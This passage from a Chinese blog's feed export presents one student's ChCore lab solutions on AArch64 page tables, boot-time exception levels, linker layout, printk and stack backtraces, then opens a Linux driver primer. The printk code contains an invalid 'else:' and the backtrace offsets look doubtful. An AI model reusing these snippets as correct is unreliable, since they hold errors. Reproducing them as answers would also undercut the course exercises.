class="line"></span><br><span class="line">		while (level &lt;= 2 &amp;&amp; (err = get_next_ptp(cur_ptp, level, va, &amp;next_ptp, &amp;next_pte, true)) == NORMAL_PTP)</span><br><span class="line">		&#123;</span><br><span class="line">			cur_ptp = next_ptp;</span><br><span class="line">			level++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		u32 index = GET_L3_INDEX(va);</span><br><span class="line">		next_pte = &amp;(cur_ptp-&gt;ent[index]);</span><br><span class="line"><span class="meta prompt_">		next_pte-&gt;</span><span class="language-bash">l3_page.is_valid = 1;</span></span><br><span class="line"><span class="meta prompt_">		next_pte-&gt;</span><span class="language-bash">l3_page.is_page = 1;</span></span><br><span class="line"><span class="meta prompt_">		next_pte-&gt;</span><span class="language-bash">l3_page.pfn = pa &gt;&gt; PAGE_SHIFT;</span></span><br><span class="line">		set_pte_flags(next_pte, flags, KERNEL_PTE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flush_tlb();</span><br><span class="line">	// &lt;/lab2&gt;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * unmap_range_in_pgtble: unmap the virtual address [va:va+len]</span><br><span class="line"> * </span><br><span class="line"> * pgtbl @ ptr for the first level page table(pgd) virtual address</span><br><span class="line"> * va @ start virtual address</span><br><span class="line"> * len @ unmapping size</span><br><span class="line"> * </span><br><span class="line"> * Hint: invoke get_next_ptp to get each level page table, don&#x27;t </span><br><span class="line"> * forget the corner case that the virtual address is not mapped.</span><br><span class="line"> * call flush_tlb() at the end of function</span><br><span class="line"> * </span><br><span class="line"> */</span><br><span class="line">int unmap_range_in_pgtbl(vaddr_t * pgtbl, vaddr_t va, size_t len)</span><br><span class="line">&#123;</span><br><span class="line">	// &lt;lab2&gt;</span><br><span class="line">	for (const vaddr_t end_va = va + len; va &lt; end_va; va+= PAGE_SIZE)</span><br><span class="line">	&#123;</span><br><span class="line">		ptp_t * cur_ptp = (ptp_t *) pgtbl;</span><br><span class="line">		ptp_t * next_ptp = NULL;</span><br><span class="line">		pte_t * next_pte = NULL;</span><br><span class="line">		int level = 0;</span><br><span class="line">		int err = 0;</span><br><span class="line"></span><br><span class="line">		while (level &lt;= 2 &amp;&amp; (err = get_next_ptp(cur_ptp, level, va, &amp;next_ptp, &amp;next_pte, false)) == NORMAL_PTP)</span><br><span class="line">		&#123;</span><br><span class="line">			cur_ptp = next_ptp;</span><br><span class="line">			level++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (err == NORMAL_PTP &amp;&amp; level == 3 &amp;&amp; cur_ptp != NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			u32 index = GET_L3_INDEX(va);</span><br><span class="line">			next_pte = &amp;(cur_ptp-&gt;ent[index]);</span><br><span class="line"><span class="meta prompt_">			next_pte-&gt;</span><span class="language-bash">pte = 0;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flush_tlb();</span><br><span class="line">	// &lt;/lab2&gt;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="内核地址空间"><a href="#内核地址空间" class="headerlink" title="内核地址空间"></a>内核地址空间</h1><p><strong>问题 5</strong></p>
<blockquote>
<p>在 AArch64 MMU 架构中，使用了两个 TTBR 寄存器，ChCore 使用一个 TTBR 寄存器映射内核地址空间，另一个寄存器映射用户态的地址空间，那么是否还需要通过设置页表位的属性来隔离内核态和用户态的地址空间?</p>
</blockquote>
<p>通过设置属性可以配置内核态无法访问用户态的地址空间，防止内核漏洞 SMEP SMAP</p>
<p><strong>问题 6</strong></p>
<blockquote>
<ol>
<li>ChCore 为什么要使用块条目组织内核内存? 哪些虚拟地址空间在 Boot 阶段必须映射，哪些虚拟地址空间可以在内核启动后延迟?</li>
</ol>
</blockquote>
<p>相比用户态内存，内核态内存的访问频率较高，使用大页 TLB miss 会减少，带来性能的提升<br>内核模块地址在 Boot 阶段需要映射，内核启动后的文件系统、进程调度等模块可以延迟启动</p>
<blockquote>
<ol start="2">
<li>为什么用户程序不能读写内核内存? 保护内核内存的具体机制是什么?</li>
</ol>
</blockquote>
<p>在访问内核内存时，使用程序标志寄存器以及页表项标志进行检测</p>
<p><strong>练习 3</strong></p>
<blockquote>
<p>完善kernel&#x2F;mm&#x2F;mm.c中的map_kernel_space()函数，实现对内核空间的映射，并且可以通过kernel_space_check()的检查。</p>
</blockquote>
<p>直接调用前面写的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">map_kernel_space</span><span class="params">(<span class="type">vaddr_t</span> va, <span class="type">paddr_t</span> pa, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="type">vaddr_t</span> *ttbr1 = (<span class="type">vaddr_t</span> *)get_ttbr1();</span><br><span class="line">    map_range_in_pgtbl(ttbr1, va, pa, len, KERNEL_PT);</span><br><span class="line">    <span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Kernel</category>
        <category>ARM</category>
      </categories>
      <tags>
        <tag>AArch64</tag>
      </tags>
  </entry>
  <entry>
    <title>ChCore Lab1 机器启动</title>
    <url>/2022/05/26/ChCore-Lab1-%E6%9C%BA%E5%99%A8%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="实验基本知识"><a href="#实验基本知识" class="headerlink" title="实验基本知识"></a>实验基本知识</h1><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习 2"></a>练习 2</h2><blockquote>
<p>启动带调试的 QEMU，使用 GDB 的where命令来跟踪入口（第一个函<br>数）及 bootloader 的地址。</p>
</blockquote>
<p>启动之后可以看到跟踪入口地址，其文件路径为 <code>/boot/Start.S</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">0x0000000000080000 in ?? ()</span><br><span class="line">(gdb) where</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x0000000000080000 <span class="keyword">in</span> _start ()</span></span><br></pre></td></tr></table></figure>

<h1 id="内核的引导与加载"><a href="#内核的引导与加载" class="headerlink" title="内核的引导与加载"></a>内核的引导与加载</h1><p>此 bootloader 程序存在于 .img 镜像，即为内核自带的 bootloader，其主要功能是</p>
<ul>
<li>通过函数 arm64_elX_to_el1 将处理器异常级别切换到 EL1</li>
<li>初始化引导 UART、页表和 MMU，随后跳转到实际内核</li>
</ul>
<h2 id="处理器异常级别"><a href="#处理器异常级别" class="headerlink" title="处理器异常级别"></a>处理器异常级别</h2><p>AArch64 通常采用 4 层安全模型，我们对 arm64_elX_to_el1 函数进行简单分析</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">BEGIN_FUNC(arm64_elX_to_el1)</span><br><span class="line">	mrs x9, CurrentEL   // 获取当前异常级别</span><br><span class="line"></span><br><span class="line">	// Check the current exception level.</span><br><span class="line">	cmp x9, CURRENTEL_EL1   // 如果异常级别为 1，则直接返回</span><br><span class="line">	beq .Ltarget</span><br><span class="line">	cmp x9, CURRENTEL_EL2   // 如果异常级别为 2，则跳转到 in_el2</span><br><span class="line">	beq .Lin_el2</span><br><span class="line">	// Otherwise, we are in EL3.</span><br><span class="line"></span><br><span class="line">	// Set EL2 to 64bit and enable the HVC instruction.</span><br><span class="line">	mrs x9, scr_el3 </span><br><span class="line">	mov x10, SCR_EL3_NS | SCR_EL3_HCE | SCR_EL3_RW // no-secure | hypervisor call enabled | execution state for lower exception level</span><br><span class="line">	orr x9, x9, x10</span><br><span class="line">	msr scr_el3, x9</span><br><span class="line"></span><br><span class="line">	// Set the return address and exception level.</span><br><span class="line">	adr x9, .Ltarget</span><br><span class="line">	msr elr_el3, x9</span><br><span class="line">	mov x9, SPSR_ELX_DAIF | SPSR_ELX_EL1H</span><br><span class="line">	msr spsr_el3, x9</span><br><span class="line"></span><br><span class="line">.Lin_el2: // 关掉 EL2 的状态</span><br><span class="line">	// Disable EL1 timer traps and the timer offset.</span><br><span class="line">	mrs x9, cnthctl_el2 // 关掉计时控制寄存器</span><br><span class="line">	orr x9, x9, CNTHCTL_EL2_EL1PCEN | CNTHCTL_EL2_EL1PCTEN</span><br><span class="line">	msr cnthctl_el2, x9</span><br><span class="line">	msr cntvoff_el2, xzr</span><br><span class="line"></span><br><span class="line">	// Disable stage 2 translations.</span><br><span class="line">	msr vttbr_el2, xzr  // 关掉 stage 2 地址转换</span><br><span class="line"></span><br><span class="line">	// Disable EL2 coprocessor traps. // 关闭 陷入 EL2 的功能</span><br><span class="line">	mov x9, CPTR_EL2_RES1</span><br><span class="line">	msr cptr_el2, x9</span><br><span class="line"></span><br><span class="line">	// Disable EL1 FPU traps.   // 关闭 浮点功能</span><br><span class="line">	mov x9, CPACR_EL1_FPEN</span><br><span class="line">	msr cpacr_el1, x9</span><br><span class="line"></span><br><span class="line">	// Check whether the GIC system registers are supported.</span><br><span class="line">	mrs x9, id_aa64pfr0_el1 // 是否启用中断控制器</span><br><span class="line">	and x9, x9, ID_AA64PFR0_EL1_GIC</span><br><span class="line">	cbz x9, .Lno_gic_sr</span><br><span class="line"></span><br><span class="line">	// Enable the GIC system registers in EL2, and allow their use in EL1.</span><br><span class="line">	mrs x9, ICC_SRE_EL2 // 启动 EL2 的 GIC 系统寄存器</span><br><span class="line">	mov x10, ICC_SRE_EL2_ENABLE | ICC_SRE_EL2_SRE</span><br><span class="line">	orr x9, x9, x10</span><br><span class="line">	msr ICC_SRE_EL2, x9</span><br><span class="line"></span><br><span class="line">	// Disable the GIC virtual CPU interface.</span><br><span class="line">	msr ICH_HCR_EL2, xzr // 关闭 GIC 虚拟 CPU 接口</span><br><span class="line"></span><br><span class="line">.Lno_gic_sr:    // 启动</span><br><span class="line">	// Set EL1 to 64bit.</span><br><span class="line">	mov x9, HCR_EL2_RW</span><br><span class="line">	msr hcr_el2, x9</span><br><span class="line"></span><br><span class="line">	// Set the return address and exception level.</span><br><span class="line">	adr x9, .Ltarget</span><br><span class="line">	msr elr_el2, x9</span><br><span class="line">	mov x9, SPSR_ELX_DAIF | SPSR_ELX_EL1H</span><br><span class="line">	msr spsr_el2, x9</span><br><span class="line"></span><br><span class="line">	isb</span><br><span class="line">	eret</span><br><span class="line"></span><br><span class="line">.Ltarget:</span><br><span class="line">	ret</span><br><span class="line">END_FUNC(arm64_elX_to_el1)</span><br></pre></td></tr></table></figure>

<h2 id="练习-3"><a href="#练习-3" class="headerlink" title="练习 3"></a>练习 3</h2><blockquote>
<p>结合readelf -S build&#x2F;kernel.img读取符号表与练习 2 中的GDB 调试信息，请找出请找出build&#x2F;kernel.image入口定义在哪个文件中。继续借助单步调试追踪程序的执行过程，思考一个问题：目前本实验中支持的内核是单核版本的内核，然而在 Raspi3 上电后，所有处理器会同时启动。结合boot&#x2F;start.S中的启动代码，并说明挂起其他处理器的控制流。</p>
</blockquote>
<h3 id="入口定义函数"><a href="#入口定义函数" class="headerlink" title="入口定义函数"></a>入口定义函数</h3><p>readelf 结果</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">os@ubuntu:~/chcore-lab/build$ readelf -S kernel.img </span><br><span class="line">There are 9 section headers, starting at offset 0x20cd8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] init              PROGBITS         0000000000080000  00010000</span><br><span class="line">       000000000000b5b0  0000000000000008 WAX       0     0     4096</span><br><span class="line">  [ 2] .text             PROGBITS         ffffff000008c000  0001c000</span><br><span class="line">       00000000000011dc  0000000000000000  AX       0     0     8</span><br><span class="line">  [ 3] .rodata           PROGBITS         ffffff0000090000  00020000</span><br><span class="line">       00000000000000f8  0000000000000001 AMS       0     0     8</span><br><span class="line">  [ 4] .bss              NOBITS           ffffff0000090100  000200f8</span><br><span class="line">       0000000000008000  0000000000000000  WA       0     0     16</span><br><span class="line">  [ 5] .comment          PROGBITS         0000000000000000  000200f8</span><br><span class="line">       0000000000000032  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 6] .symtab           SYMTAB           0000000000000000  00020130</span><br><span class="line">       0000000000000858  0000000000000018           7    46     8</span><br><span class="line">  [ 7] .strtab           STRTAB           0000000000000000  00020988</span><br><span class="line">       000000000000030f  0000000000000000           0     0     1</span><br><span class="line">  [ 8] .shstrtab         STRTAB           0000000000000000  00020c97</span><br><span class="line">       000000000000003c  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>init</code> 段的入口地址是 <code>0x80000</code>，其在 <code>CMakefiles.txt</code> 中定义，可以看到</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">set(link_script &quot;linker.lds&quot;) // 设置链接脚本</span><br><span class="line">configure_file(&quot;./scripts/linker-aarch64.lds.in&quot; &quot;linker.lds.S&quot;)</span><br><span class="line"></span><br><span class="line">    - 在链接脚本中可以看到，将 init 段的内容设置为下面几个 binary 的结合</span><br><span class="line">        . = TEXT_OFFSET;</span><br><span class="line">        img_start = .;</span><br><span class="line">        init : &#123;</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/start.S.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/mmu.c.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/tools.S.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/init_c.c.o</span><br><span class="line">            CMakeFiles/kernel.img.dir/boot/uart.c.o</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">set_property( // 链接参数设置启动函数为 _start</span><br><span class="line">    TARGET kernel.img</span><br><span class="line">    APPEND_STRING</span><br><span class="line">    PROPERTY</span><br><span class="line">        LINK_FLAGS</span><br><span class="line">        &quot;-T $&#123;CMAKE_CURRENT_BINARY_DIR&#125;/$&#123;link_script&#125; -e _start&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>即入口地址定义在 <code>/boot/image.h</code> 文件中，尝试修改 <code>TEXT_OFFSET</code> 为 <code>0x70000</code>，重新编译并启动调试后可以看到</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">0x0000000000070000 in ?? ()</span><br><span class="line">(gdb) where</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x0000000000070000 <span class="keyword">in</span> _start ()</span></span><br></pre></td></tr></table></figure>

<h3 id="启动代码挂起控制流"><a href="#启动代码挂起控制流" class="headerlink" title="启动代码挂起控制流"></a>启动代码挂起控制流</h3><p>对 <code>start.S</code> 进行分析</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">BEGIN_FUNC(_start)</span><br><span class="line">	mrs	x8, mpidr_el1   // mpidr Multiprocesser 辅助识别寄存器，根据此信息判断当前 CPU 身份</span><br><span class="line">	and	x8, x8,	#0xFF</span><br><span class="line">	cbz	x8, primary // 如果 id 为 0 则跳转至 primary 启动，如果不是则直接挂起</span><br><span class="line"></span><br><span class="line">  /* hang all secondary processors before we intorduce multi-processors */</span><br><span class="line">secondary_hang:</span><br><span class="line">	bl secondary_hang</span><br><span class="line">// 至此会挂起其他处理器的控制流</span><br><span class="line">primary:</span><br><span class="line"></span><br><span class="line">	/* Turn to el1 from other exception levels. */</span><br><span class="line">	bl 	arm64_elX_to_el1</span><br><span class="line"></span><br><span class="line">	/* Prepare stack pointer and jump to C. */</span><br><span class="line">	adr 	x0, boot_cpu_stack // 4 个 CPU 每个 CPU 栈大小为 0x1000</span><br><span class="line">	add 	x0, x0, #0x1000 // 将第一个 CPU 栈底设置好</span><br><span class="line">	mov 	sp, x0</span><br><span class="line"></span><br><span class="line">	bl 	init_c  // 执行 C 程序</span><br><span class="line"></span><br><span class="line">	/* Should never be here */</span><br><span class="line">	b	.</span><br><span class="line">END_FUNC(_start)</span><br></pre></td></tr></table></figure>
<h2 id="练习-4"><a href="#练习-4" class="headerlink" title="练习 4"></a>练习 4</h2><blockquote>
<p>查看build&#x2F;kernel.img的objdump信息。比较每一个段中的 VMA 和 LMA 是否相同，为什么？在 VMA 和 LMA 不同的情况下，内核是如何将该段的地址从 LMA 变为 VMA？提示：从每一个段的加载和运行情况进行分析</p>
</blockquote>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -h kernel.img</span> </span><br><span class="line"></span><br><span class="line">kernel.img:     file format elf64-little</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  0 init          0000b5b0  0000000000070000  0000000000070000  00010000  2**12</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, CODE</span><br><span class="line">  1 .text         000011dc  ffffff000007c000  000000000007c000  0001c000  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  2 .rodata       000000f8  ffffff0000080000  0000000000080000  00020000  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  3 .bss          00008000  ffffff0000080100  0000000000080100  000200f8  2**4</span><br><span class="line">                  ALLOC</span><br><span class="line">  4 .comment      00000032  0000000000000000  0000000000000000  000200f8  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br></pre></td></tr></table></figure>
<p>可以看到仅有 init 段的 LMA 和 VMA 是一致的，这点需要通过分析链接脚本进行分析</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">. = TEXT_OFFSET;  // 当前指针地址为 0x80000</span><br><span class="line">img_start = .;</span><br><span class="line">init : &#123;</span><br><span class="line">    $&#123;init_object&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">. = ALIGN(SZ_16K); // 内存对齐</span><br><span class="line"></span><br><span class="line">init_end = ABSOLUTE(.);</span><br><span class="line">// 此时将 VMA 设置为 KERNEL_VADDR + init_end</span><br><span class="line">.text KERNEL_VADDR + init_end : AT(init_end) &#123;</span><br><span class="line">    *(.text*)</span><br><span class="line">&#125;</span><br><span class="line">// 后面自动递增</span><br><span class="line">. = ALIGN(SZ_64K);</span><br><span class="line">.data : &#123;</span><br><span class="line">    *(.data*)</span><br><span class="line">&#125;</span><br><span class="line">. = ALIGN(SZ_64K);</span><br><span class="line"></span><br><span class="line">.rodata : &#123;</span><br><span class="line">    *(.rodata*)</span><br><span class="line">&#125;</span><br><span class="line">_edata = . - KERNEL_VADDR;</span><br><span class="line"></span><br><span class="line">_bss_start = . - KERNEL_VADDR;</span><br><span class="line">.bss : &#123;</span><br><span class="line">    *(.bss*)</span><br><span class="line">&#125;</span><br><span class="line">_bss_end = . - KERNEL_VADDR;</span><br><span class="line">. = ALIGN(SZ_64K);</span><br><span class="line">img_end = . - KERNEL_VADDR;</span><br></pre></td></tr></table></figure>
<h2 id="练习-5"><a href="#练习-5" class="headerlink" title="练习 5"></a>练习 5</h2><blockquote>
<p>以不同的进制打印数字的功能（例如 8、10、16）尚未实现，请在kernel&#x2F;common&#x2F;printk.c 中填充 printk_write_num 以完善printk的功能。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">printk_write_num</span><span class="params">(<span class="type">char</span> **out, <span class="type">long</span> <span class="type">long</span> i, <span class="type">int</span> base, <span class="type">int</span> sign,</span></span><br><span class="line"><span class="params">			    <span class="type">int</span> width, <span class="type">int</span> flags, <span class="type">int</span> letbase)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> print_buf[PRINT_BUF_LEN];</span><br><span class="line">	<span class="type">char</span> *s;</span><br><span class="line">	<span class="type">int</span> t, neg = <span class="number">0</span>, pc = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u = i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">		print_buf[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		print_buf[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> prints(out, print_buf, width, flags);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sign &amp;&amp; base == <span class="number">10</span> &amp;&amp; i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            neg = <span class="number">1</span>;</span><br><span class="line">            u = -i;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 按照要求添加进制转换功能即可</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> fill your code here</span></span><br><span class="line">    s = print_buf + PRINT_BUF_LEN - <span class="number">1</span>;</span><br><span class="line">    *s = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span>(u &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s--;</span><br><span class="line">        t = u % base;</span><br><span class="line">        <span class="keyword">if</span> (t &lt;= <span class="number">9</span>)</span><br><span class="line">            *s = t + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            *s = t - <span class="number">10</span> + (letbase ? <span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        u /= base;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// store the digitals in the buffer `print_buf`:</span></span><br><span class="line">    <span class="comment">// 1. the last postion of this buffer must be &#x27;\0&#x27;</span></span><br><span class="line">    <span class="comment">// 2. the format is only decided by `base` and `letbase` here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (neg) &#123;</span><br><span class="line">        <span class="keyword">if</span> (width &amp;&amp; (flags &amp; PAD_ZERO)) &#123;</span><br><span class="line">            simple_outputchar(out, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">            ++pc;</span><br><span class="line">            --width;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            *--s = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pc + prints(out, s, width, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数栈"><a href="#函数栈" class="headerlink" title="函数栈"></a>函数栈</h2><p>在格式化输出后，增加调测内核态能力：堆栈回溯</p>
<p>栈指针（SP）：指向正在使用的栈顶<br>帧指针（FP）：指向当前函数的栈底</p>
<p><strong>练习 6</strong></p>
<blockquote>
<p>内核栈初始化（即初始化 SP 和 FP）的代码位于哪个函数？内核栈在内<br>存中位于哪里？内核如何为栈保留空间？</p>
</blockquote>
<p>初始化代码</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">adr 	x0, boot_cpu_stack</span><br><span class="line">add 	x0, x0, #0x1000</span><br><span class="line">mov 	sp, x0</span><br></pre></td></tr></table></figure>

<p>会在 bootloader 中为每个 CPU 分配栈结构，进入内核后会再次分配函数栈</p>
<p><strong>练习 7</strong></p>
<blockquote>
<p>为了熟悉 AArch64 上的函数调用惯例，请在kernel&#x2F;main.c中通过<br>GDB 找到stack_test函数的地址，在该处设置一个断点，并检查在内<br>核启动后的每次调用情况。每个stack_test递归嵌套级别将多少个 64<br>位值压入堆栈，这些值是什么含义？</p>
</blockquote>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">Thread 1 hit Breakpoint 1, 0xffffff000008c020 in stack_test ()</span><br><span class="line">(gdb) x/20i $pc</span><br><span class="line">=&gt; 0xffffff000008c020 &lt;stack_test&gt;:	stp	x29, x30, [sp, #-32]!   // 将 FP LR x19 存入栈中</span><br><span class="line">   0xffffff000008c024 &lt;stack_test+4&gt;:	mov	x29, sp</span><br><span class="line">   0xffffff000008c028 &lt;stack_test+8&gt;:	str	x19, [sp, #16]</span><br><span class="line">   0xffffff000008c02c &lt;stack_test+12&gt;:	mov	x19, x0</span><br><span class="line">   0xffffff000008c030 &lt;stack_test+16&gt;:	mov	x1, x0</span><br></pre></td></tr></table></figure>

<p><strong>练习 8</strong></p>
<blockquote>
<p>在 AArch64 中，返回地址（保存在x30寄存器），帧指针（保存在x29寄<br>存器）和参数由寄存器传递。但是，当调用者函数（caller function）调<br>用被调用者函数（callee fcuntion）时，为了复用这些寄存器，这些寄<br>存器中原来的值是如何被存在栈中的？请使用示意图表示，回溯函数所<br>需的信息（如 SP、FP、LR、参数、部分寄存器值等）在栈中具体保存<br>的位置在哪？</p>
</blockquote>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">|           |</span><br><span class="line">|Father&#x27;s FP| ------+</span><br><span class="line">| L     R   |       |</span><br><span class="line">| Paramter  |       |</span><br><span class="line">|Other Data |       |</span><br><span class="line">+-----------+       |</span><br><span class="line">|....       |       |</span><br><span class="line">|.....      |       |</span><br><span class="line">|....       |       |</span><br><span class="line">+-----------+       |</span><br><span class="line">|Father&#x27;s FP| &lt;-----+</span><br><span class="line">+-----------+</span><br><span class="line">|   L   R   |</span><br><span class="line">+-----------+</span><br><span class="line">| Parameter |   ^</span><br><span class="line">+-----------+   |</span><br><span class="line">|Other Data |   |   High Address</span><br><span class="line">|           |   |</span><br></pre></td></tr></table></figure>

<p><strong>练习 9</strong></p>
<blockquote>
<p>使 用 与 示 例 相 同 的 格 式， 在kernel&#x2F;monitor.c中 实<br>现stack_backtrace。为了忽略编译器优化等级的影响，只需要<br>考虑stack_test的情况，我们已经强制了这个函数编译优化等级。<br>挑战：请思考，如果考虑更多情况（例如，多个参数）时，应当如何进<br>行回溯操作？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">u64* fp = *((u64*)read_fp());</span><br><span class="line"><span class="keyword">while</span> (fp != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;LR %lx FP %lx Args %lx %lx %lx %lx %lx\n&quot;</span>, *(fp+<span class="number">1</span>), fp, *(fp<span class="number">-2</span>), *(fp<span class="number">-1</span>), *(fp), *(fp+<span class="number">1</span>), *(fp+<span class="number">2</span>));</span><br><span class="line">    fp = (u64*)*fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kernel</category>
        <category>ARM</category>
      </categories>
      <tags>
        <tag>AArch64</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux设备驱动程序之基础知识</title>
    <url>/2022/05/24/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<span id="more"></span>

<p>本文主要参考《Linux设备驱动程序》一书</p>
<h2 id="设备和模块的分类"><a href="#设备和模块的分类" class="headerlink" title="设备和模块的分类"></a>设备和模块的分类</h2><p>以 Linux 方式看待设备一般分为 3 种基本设备类型，模块常常实现其中一种</p>
<ul>
<li><p>字符设备<br>可以当作字节流存取的设备（如同一个文件），字符驱动负责实现其行为，一般至少实现 open，close、read、write 系统调用。标准例子：文本控制台 <code>/dev/console</code> 串口 <code>/dev/ttyS0</code>。大部分字符设备仅仅是数据通道，只能顺序存取，但是可以在里面进行偏移</p>
</li>
<li><p>块设备<br>通过 <code>/dev</code> 目录的文件系统节点进行存取，在 Linux 系统中允许像字符设备一样一次传输任意数目的字节</p>
</li>
<li><p>网络接口<br>任何网络事务都通过接口来进行，即能够与其他主机交换数据的设备。网络接口负责发送和接受数据报文，网络设备常常设计成处理报文的发送和发送，而非流，并且网络驱动对连接一无所知，只处理报文。<br>网络接口不像字符设备和块设备一样映射到文件系统上，但是对接口的存取方式仍然是通过分配名称，如 ens33，内核与网络设备驱动的通讯不用 read 和 write，内核调用和报文传递相关的函数</p>
</li>
</ul>
<h2 id="构建和运行模块-HELLO-WORLD"><a href="#构建和运行模块-HELLO-WORLD" class="headerlink" title="构建和运行模块 HELLO WORLD"></a>构建和运行模块 HELLO WORLD</h2><p>构建最简单的打印消息模块<br><strong>Makefile</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">ifeq ($(KERNELRELEASE),)</span><br><span class="line"></span><br><span class="line">	KERNELDIR ?= /lib/modules/$(shell uname -r)/build // 内核源码目录</span><br><span class="line">	PWD := $(shell pwd) // 编译目录</span><br><span class="line"></span><br><span class="line">modules:</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">(MAKE) -C $(KERNELDIR) M=$(PWD) modules</span></span><br><span class="line"></span><br><span class="line">modules_install:</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">(MAKE) -C $(KERNELDIR) M=$(PWD) modules_install</span></span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">(MAKE) -C $(KERNELDIR) M=$(PWD) clean</span></span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">	obj-m := hello.o</span><br><span class="line">endif</span><br></pre></td></tr></table></figure>
<p><strong>hello.c</strong></p>
